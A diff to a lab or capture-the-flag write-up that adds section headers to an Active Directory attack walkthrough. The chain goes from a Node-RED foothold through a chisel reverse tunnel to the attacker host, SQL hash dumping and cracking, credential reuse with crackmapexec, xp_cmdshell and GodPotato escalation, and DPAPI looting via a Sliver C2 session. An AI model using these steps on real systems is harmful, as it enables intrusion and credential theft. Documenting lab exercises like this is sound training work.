@@ -28,6 +28,8 @@ PORT     STATE SERVICE
 22/tcp     open  ssh
 1880/tcp   open  vsat-control
 ```
+# Exploit NodeRed
+
 Going to the website on 10.10.208.103 on port 1880 give us this page :
 
 ![alt text](../assets/image_tengu/nodered1er.png)
@@ -91,6 +93,8 @@ chisel server -p 9999 --reverse
 # on target machine
 ./chisel client 10.8.2.163:9999 R:socks &
 ```
+# Crack .node-red creds
+
 Before pivoting, let's try to find creds on the machine :
 
 ```bash
@@ -167,6 +171,8 @@ SQL (nodered_connector  nodered_connector@Demo)> select * from users;
 NULL   b't2_m.winters'   b'af[...]147'
 ```
 We can crack the hash using this site : [https://crackstation.net/](https://crackstation.net/)
+
+# GMSA Password to Delegation Rights
 
 ```bash
 proxychains -q cme ldap 10.10.208.101 -u 't2_m.winters' -p 'REDACTED'
@@ -281,6 +287,8 @@ Impacket v0.12.0.dev1+20240823.155701.089603e0 - Copyright 2023 Fortra
 
 [*] Encryption required, switching to TLS
 ```
+# XP_CMDSHELL to GodPotato
+
 So instead of Administrator we gonna impersonate a user which is in sql_admins group :
 
 ```bash
@@ -337,6 +345,8 @@ Task.ps1 NT AUTHORITY\SYSTEM:(I)(F)
 Successfully processed 1 files; Failed processing 0 files
 ```
 So we can just replace this task by a revshell that gonna be execute as T0_c.fowler but i'm gonna use another way to become DA of this chain.
+
+# DPAPI 
 
 ```bash
 sliver (sidecar-http) > sharpdpapi machinetriage
